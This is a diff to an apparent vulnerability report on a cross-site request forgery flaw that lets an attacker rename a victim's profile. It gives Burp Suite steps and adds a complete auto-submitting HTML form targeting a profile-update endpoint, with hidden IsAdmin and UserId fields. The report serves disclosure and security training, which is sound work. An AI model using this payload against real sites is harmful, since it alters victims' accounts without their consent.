@@ -3,3 +3,25 @@
 Summary: CSRF (Cross-Site Request Forgery) makes an attacker to change name of victim's account
 Steps to reproduce: Go to edit profile, enter any random text and capture the request in burp. Then right click on the request, click on engagement tools, and Generate CSRF PoC. In options, enable Include auto-submit script, and click Regenerate and copy the code and drop the request. Now, create a HTML file in your system and paste the copied CSRF PoC and save and run the file. Now you can see that your first name and last name is changed.
 Impact: An attacker can edit the profile of victim.
+
+
+
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://hack-yourself-first.com/Account/UserProfile/$userid" method="POST">
+      <input type="hidden" name="IsAdmin" value="" />
+      <input type="hidden" name="UserId" value="333" />
+      <input type="hidden" name="FirstName" value="$firstname" />
+      <input type="hidden" name="LastName" value="$lastname" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+update $userid, $firstname and $lastname to their respective ones
